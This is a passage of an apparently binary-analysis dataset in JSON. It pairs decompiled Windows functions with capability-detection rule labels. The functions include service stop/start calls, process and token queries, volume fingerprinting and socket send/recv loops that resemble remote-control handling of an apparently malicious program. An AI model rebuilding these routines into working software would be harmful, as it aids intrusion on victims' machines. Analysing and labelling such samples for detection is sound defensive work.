        "decompiled_code": "\nvoid fcn.0048ac50(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint var_108h;\n    uint hObject;\n    \n    uStack280 = 0x48ac6b;\n    fcn.004054c0();\n    uStack284 = 0;\n    uStack288 = 0x1f0fff;\n    puStack292 = 0x48ac78;\n    iVar1 = sub.kernel32.dll_OpenProcess();\n    uStack296 = 0x48acdf;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    if (iVar1 == 0) {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404f60();\n    }\n    else {\n        uVar3 = 0x104;\n        puStack292 = &stack0xfffffffc;\n        iVar2 = fcn.0044cc70(0x104);\n        if (iVar2 != 0) {\n            fcn.004056dc();\n            *in_FS_OFFSET = uVar3;\n            uStack296 = 0x48ace6;\n            iStack300 = iVar1;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        fcn.00404f60();\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "0048b9f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b9f4(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint lpServiceStatus;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x48ba09;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack52 = 0x48ba11;\n    fcn.004058ec();\n    uStack56 = 0x48baaf;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStack64 = 0xf003f;\n    uStack68 = 0;\n    uStack72 = 0x48ba2e;\n    puStack52 = &stack0xfffffffc;\n    uStack72 = fcn.004058fc();\n    puStack76 = 0x48ba34;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack80 = 0x48ba8d;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        sub.advapi32.dll_ControlService(uVar1, 1, &fcn.0048b9f4::lpServiceStatus);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x48ba94);\n        return;\n    }\n    *in_FS_OFFSET = uStack72;\n    uStack64 = 0x48bab6;\n    uStack68 = 0x48baae;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 504
    },
    "0048babc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048babc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t hSCManager;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48bad1;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack28 = 0x48bad9;\n    fcn.004058ec();\n    uStack32 = 0x48bb7c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0xf003f;\n    uStack44 = 0;\n    uStack48 = 0x48baf6;\n    puStack28 = &stack0xfffffffc;\n    uStack48 = fcn.004058fc();\n    puStack52 = 0x48bafc;\n    hSCManager = sub.advapi32.dll_OpenSCManagerA();\n    if (hSCManager != 0) {\n        uStack56 = 0x48bb5a;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        uVar1 = fcn.004058fc(0xf01ff);\n        uVar1 = sub.advapi32.dll_OpenServiceA(hSCManager, uVar1);\n        var_10h = 0;\n        sub.advapi32.dll_StartServiceA(uVar1, 0, &fcn.0048babc::var_10h);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = uVar1;\n        sub.advapi32.dll_CloseServiceHandle(hSCManager, 0x48bb61);\n        return;\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x48bb83;\n    uStack44 = 0x48bb7b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 514
    },
    "0048cac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * fcn.0048cac8(void)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t *puStack100;\n    \n    iVar1 = sub.advapi32.dll_IsValidSid();\n    if (iVar1 != 0) {\n        pcVar2 = sub.advapi32.dll_GetSidIdentifierAuthority();\n        puVar3 = sub.advapi32.dll_GetSidSubAuthorityCount();\n        uVar5 = *puVar3;\n        uVar4 = uVar5 * 0xc + 0x1c;\n        if (uVar4 < *in_EAX || uVar4 == *in_EAX) {\n            fcn.0040ae14(0);\n            if ((*pcVar2 == '\\0') && (pcVar2[1] == '\\0')) {\n                arg_8h = 0;\n                fcn.0040a764();\n                fcn.0040ae14(arg_8h);\n            }\n            else {\n                arg_8h = 5;\n                fcn.0040a764();\n                fcn.0040ae14(arg_8h);\n            }\n            fcn.0040a764();\n            do {\n                sub.advapi32.dll_GetSidSubAuthority();\n                fcn.0040ae14(arg_8h);\n                fcn.0040a764();\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n            puStack100 = 0xffffffff;\n        }\n        else {\n            *in_EAX = uVar4;\n            sub.kernel32.dll_SetLastError(0x7a);\n            puStack100 = in_EAX;\n        }\n    }\n    return puStack100;\n}\n",
        "token_count": 413
    },
    "0048e704": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e704(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffcc;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48e71c;\n    fcn.004058ec();\n    puStack28 = 0x48e724;\n    fcn.004058ec();\n    uStack32 = 0x48e78f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    iVar2 = sub.kernel32.dll_LoadLibraryA(uVar1);\n    if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetModuleHandleA_2(uVar1),  iVar2 != 0)) {\n        uVar1 = fcn.004058fc();\n        uVar1 = sub.kernel32.dll_GetProcAddress_1(iVar2, uVar1);\n        *param_1 = uVar1;\n        in_stack_ffffffcc = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405490(0x48e796);\n    return;\n}\n",
        "token_count": 330
    },
    "0048ef08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048f076)\n\nvoid fcn.0048ef08(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint ReturnLength;\n    int32_t var_14h;\n    int32_t TokenInformation;\n    uint TokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x48f0b3;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48f04e;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = &fcn.0048ef08::TokenHandle;\n    uStack76 = 8;\n    uStack80 = 0x48ef43;\n    uStack80 = sub.kernel32.dll_GetCurrentProcess();\n    puStack84 = 0x48ef49;\n    iVar1 = sub.advapi32.dll_OpenProcessToken();\n    if (iVar1 == 0) {\n        puStack84 = 0x48f044;\n        fcn.004054c0();\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x48f070;\n        fcn.00409a78();\n        *in_FS_OFFSET = puStack84;\n        uStack76 = 0x48f0ba;\n        uStack80 = 0x48f0aa;\n        fcn.0040546c();\n        uStack80 = 0x48f0b2;\n        fcn.0040546c();\n        return;\n    }\n    uStack88 = 0x48f030;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x12, &fcn.0048ef08::TokenInformation, 4, &fcn.0048ef08::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else if (TokenInformation == 1) {\n        fcn.00405504();\n    }\n    else if (TokenInformation == 2) {\n        fcn.00405504();\n    }\n    else if (TokenInformation == 3) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00405504();\n    }\n    uVar2 = TokenHandle;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x14, &fcn.0048ef08::var_14h, 4, &fcn.0048ef08::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else if (var_14h == 0) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48f044);\n    return;\n}\n",
        "token_count": 825
    },
    "0048f81c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048f81c(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    double dStack12;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack52 = 0x48f8eb;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    dStack12 = param_1;\n    iVar1 = -1;\n    do {\n        dStack12 = dStack12 / *0x48f8fc;\n        iVar1 = iVar1 + 1;\n        iVar3 = fcn.0040344c();\n        if (iVar3 == 0) {\n            dStack12 = dStack12 * *0x48f8fc;\n            break;\n        }\n    } while (iVar1 < 4);\n    fVar2 = dStack12;\n    arg_8h = SUB104(fVar2, 0);\n    fcn.00403410(arg_8h, fVar2 >> 0x20, fVar2 >> 0x40, &var_ch);\n    _var_20h = dStack12;\n    var_14h = &var_20h;\n    var_10h._0_1_ = 3;\n    fcn.0040ae94(arg_8h);\n    fcn.00405784();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040546c(0xf8f2);\n    return;\n}\n",
        "token_count": 413
    },
    "0048fdec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048fe97)\n\nvoid __fastcall fcn.0048fdec(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack328;\n    uint uStack324;\n    uchar *puStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint var_120h;\n    uint var_11ch;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack320 = &stack0xfffffffc;\n    puStack308 = 0x48fe14;\n    var_8h = param_2;\n    fcn.004058ec();\n    uStack312 = 0x48feec;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    uStack324 = 0x48feaf;\n    uStack328 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb8;\n    uVar2 = 0;\n    puStack308 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(&fcn.0048fdec::var_115h, 0x105, 0, &fcn.0048fdec::var_ch, &fcn.0048fdec::var_10h, 0, 0);\n    sub.kernel32.dll_GetVolumeInformationA();\n    fcn.004056dc();\n    fcn.00409a78();\n    fcn.004054c0();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48fef3);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 418
    },
    "0049029c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0049029c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EDX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_560h;\n    uint var_55ch;\n    uint var_15ch;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.004058ec();\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffa84;\n    fcn.0040546c();\n    fcn.0040546c();\n    cVar1 = fcn.0040a168();\n    if (cVar1 != '\\0') {\n        fcn.00403760();\n        **0x4a5028 = 0;\n        fcn.00403e58();\n        fcn.0040304c();\n        iVar2 = 0;\n        fcn.00403e80();\n        fcn.0040304c();\n        while( true ) {\n            fcn.00403ae4();\n            arg_8h_00 = &var_10h;\n            fcn.004038c8(arg_8h_00);\n            fcn.0040304c();\n            if (var_10h < 1) break;\n            iVar2 = iVar2 + 1;\n            fcn.004056dc();\n            fcn.00405738();\n            if ((in_EDX <= iVar2) || (var_10h == 0)) break;\n        }\n        fcn.004054c0();\n        fcn.00403908();\n        fcn.0040304c();\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.0040546c();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 434
    },
    "00490b5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00490b5c noreturn (uint arg_8h)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar auStackY8260 [3524];\n    uint uStackY4736;\n    uchar *puStackY4728;\n    uint uStackY4724;\n    uint uStackY4720;\n    uint uStackY4716;\n    uchar *puStackY4712;\n    int32_t iStackY4708;\n    int32_t iStackY4704;\n    uint uStackY4700;\n    uint uStack4580;\n    uint uStack4576;\n    uchar *puStack4572;\n    uint uStack4568;\n    uint uStack4564;\n    uchar *puStack4560;\n    uint uStack4556;\n    uint uStack4552;\n    uchar *puStack4548;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4560 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack4548 = 0x490baf;\n    fcn.00405f08();\n    uStack4552 = 0x490f10;\n    uStack4556 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee34;\n    uStack4564 = 0x490ea2;\n    uStack4568 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee28;\n    puStack4572 = 0x490bda;\n    puStack4548 = &stack0xfffffffc;\n    fcn.00408460();\n    puStack4572 = 0x490be4;\n    fcn.00405504();\n    puStack4572 = 0x490bef;\n    fcn.00405504();\n    puStack4572 = 0x490bfa;\n    fcn.00405504();\n    puStack4572 = 0x490c05;\n    fcn.00405504();\n    puStack4572 = 0x490c10;\n    fcn.00405504();\n    uStack4576 = 0x490c6f;\n    uStack4580 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee1c;\n    puStack4572 = &stack0xfffffffc;\n    cVar2 = fcn.0040a168();\n    if (cVar2 == '\\0') {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    iVar1 = fcn.0048d970();\n    if (iVar1 <= *0x490f24) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    *in_FS_OFFSET = uStack4580;\n    puStack4572 = NULL;\n    uStack4576 = 1;\n    uStack4580 = 2;\n    iVar3 = sub.wsock32.dll_socket();\n    if (iVar3 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    iVar4 = sub.wsock32.dll_inet_addr();\n    if ((iVar4 == -1) && (iVar4 = sub.wsock32.dll_gethostbyname(),  iVar4 == 0)) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_connect();\n    iVar4 = sub.wsock32.dll_recv();\n    if (iVar4 != -1) {\n        fcn.00405800();\n        fcn.0049393c();\n        iVar4 = sub.wsock32.dll_recv();\n        if (iVar4 != -1) {\n            var_40h = SUB104(iVar1, 0);\n            fcn.0040b5dc(var_40h);\n            fcn.00405784();\n            fcn.004939cc();\n            uStackY4700 = 0x490dd5;\n            iVar4 = sub.wsock32.dll_recv();\n            if (iVar4 != -1) {\n                uStackY4700 = 0x490dea;\n                fcn.00403760();\n                **0x4a5028 = 0;\n                uStackY4700 = 0x490e02;\n                fcn.00403e58();\n                while( true ) {\n                    uStackY4700 = 0x490e14;\n                    fcn.00403ae4();\n                    iStackY4704 = 0x490e2e;\n                    fcn.004038c8(&fcn.00490b5c::var_30h);\n                    if (var_30h < 1) break;\n                    iStackY4704 = 0;\n                    iStackY4708 = var_30h;\n                    puStackY4712 = &stack0xffffdfbc;\n                    uStackY4720 = 0x490e4a;\n                    iVar4 = sub.wsock32.dll_send();\n                    if (iVar4 == -1) break;\n                    uStackY4720 = 0;\n                    uStackY4724 = 0x2000;\n                    puStackY4728 = &stack0xffffdfbc;\n                    uStackY4736 = 0x490e64;\n                    iVar4 = sub.wsock32.dll_recv();\n                    if ((iVar4 == -1) || (var_30h == 0)) break;\n                }\n            }\n        }\n    }\n    uStackY4700 = 2;\n    iStackY4708 = 0x490e78;\n    iStackY4704 = iVar3;\n    sub.wsock32.dll_shutdown();\n    puStackY4712 = 0x490e81;\n    iStackY4708 = iVar3;\n    sub.wsock32.dll_closesocket();\n    puStackY4712 = 0x490e8c;\n    fcn.00403908();\n    puStackY4712 = 0x490e91;\n    fcn.0040304c();\n    puStackY4712 = NULL;\n    // WARNING: Subroutine does not return\n    uStackY4716 = 0x490e98;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1515
    },
    "004919f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004919f0 noreturn (int32_t arg_8h)\n\n{\n    **0x4a5110 = 0;\n    if (*(arg_8h + -4) != 0) {\n        fcn.0040f840();\n    }\n    if (*(arg_8h + -8) != 0) {\n        fcn.0040f840();\n    }\n    if (*(arg_8h + -0xc) != 0) {\n        fcn.0040f840();\n    }\n    if (**0x4a5004 != 0) {\n        fcn.004302b8();\n        fcn.00404640();\n        sub.kernel32.dll_Sleep_1(1000);\n    }\n    sub.wsock32.dll_shutdown(*(arg_8h + -0x10), 2);\n    sub.wsock32.dll_closesocket(*(arg_8h + -0x10));\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 227
    },
    "00491e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00491e9c noreturn (int32_t arg_8h)\n\n{\n    **0x4a50b0 = 0;\n    if (*(arg_8h + -4) != 0) {\n        fcn.0040f840();\n    }\n    if (*(arg_8h + -8) != 0) {\n        fcn.0040f840();\n    }\n    if (*(arg_8h + -0xc) == 1) {\n        fcn.0048d5b4();\n    }\n    if (*(arg_8h + -0x10) == 1) {\n        fcn.0048d708();\n    }\n    if (*(arg_8h + -0x14) == 1) {\n        fcn.0048e7a0();\n    }\n    if (*(arg_8h + -0x18) == 1) {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 0xffffffff);\n    }\n    sub.wsock32.dll_shutdown(*(arg_8h + -0x1c), 2);\n    sub.wsock32.dll_closesocket(*(arg_8h + -0x1c));\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 293
    },
    "00491f44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00491f44 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uchar auStackY8284 [3916];\n    uint uStackY4368;\n    uchar *puStackY4360;\n    uint uStackY4356;\n    uint uStack4248;\n    uint uStack4244;\n    uchar *puStack4240;\n    uint uStack4236;\n    uint uStack4232;\n    uchar *puStack4228;\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4240 = &stack0xfffffffc;\n    iVar1 = 2;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puStack4228 = 0x491f8b;\n    fcn.00405f08();\n    uStack4232 = 0x4922f8;\n    uStack4236 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef74;\n    uStack4244 = 0x4922a7;\n    uStack4248 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef68;\n    puStack4228 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_socket();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    iVar1 = sub.wsock32.dll_inet_addr();\n    if ((iVar1 == -1) && (iVar1 = sub.wsock32.dll_gethostbyname(),  iVar1 == 0)) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_connect();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.00405800();\n    fcn.0049393c();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.004054c0();\n    fcn.004905a4();\n    do {\n        if (**0x4a50b0 == '\\0') {\n    // WARNING: Subroutine does not return\n            fcn.00491e9c(&stack0xfffffffc);\n        }\n        iVar1 = sub.wsock32.dll_recv();\n        if (iVar1 < 1) {\n    // WARNING: Subroutine does not return\n            uStackY4356 = 0x492120;\n            fcn.00491e9c(&stack0xfffffffc);\n        }\n        piVar2 = fcn.00404610();\n        piVar3 = fcn.0042cbe0();\n        piVar4 = fcn.00431a5c();\n        do {\n            uVar5 = **0x4a50b0 == '\\0';\n            if (uVar5) {\n    // WARNING: Subroutine does not return\n                uStackY4356 = 0x49216a;\n                fcn.00491e9c(&stack0xfffffffc);\n            }\n            fcn.004907fc();\n            (**(*piVar3 + 0x58))();\n            fcn.0041b4ac(0x492190, 0);\n            fcn.004903ec();\n            fcn.00431508();\n            fcn.00405894();\n            if (uVar5) {\n                fcn.0041bbbc();\n                sub.kernel32.dll_Sleep_1();\n            }\n            fcn.00405894();\n        } while (uVar5);\n        fcn.00405504();\n        fcn.0041bbbc();\n        (**(*piVar4 + 8))();\n        (**(*piVar4 + 0x58))();\n        fcn.0041b4ac(0, 0);\n        do {\n            fcn.00403ae4();\n            iVar1 = (**(*piVar2 + 0xc))();\n            if (iVar1 == 0) break;\n            sub.wsock32.dll_send();\n            uStackY4356 = 0x2000;\n            puStackY4360 = &stack0xffffdfa4;\n            uStackY4368 = 0x49225f;\n            sub.wsock32.dll_recv();\n        } while (iVar1 != 0);\n        fcn.004939cc();\n        fcn.0040f840();\n        fcn.0040f840();\n        fcn.0040f840();\n    } while( true );\n}\n",
        "token_count": 1192
    },
    "004926f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
